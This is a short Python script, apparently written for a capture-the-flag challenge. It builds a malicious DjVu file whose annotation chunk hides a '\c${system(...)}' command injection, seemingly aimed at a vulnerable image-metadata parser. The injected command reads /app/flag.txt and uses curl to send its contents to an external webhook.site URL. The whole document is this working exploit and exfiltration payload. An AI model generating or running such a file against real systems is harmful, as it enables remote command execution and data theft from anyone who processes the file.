from pathlib import Path
import struct

command = "cat /app/flag.txt > /tmp/x; curl --data-binary @/tmp/x https://webhook.site/8b6e42ab-ec33-44d8-91fc-8e23534aa750"
payload_str = "(metadata \"\\c${system('%s')};\")\n" % command.replace("'", "'\\''")
payload = payload_str.encode('utf-8')
chunk = b'ANTa' + struct.pack('>I', len(payload)) + payload
content = b'AT&TFORM' + struct.pack('>I', 4 + len(chunk)) + b'DJVU' + chunk
Path('exploit_flag.djvu').write_bytes(content)
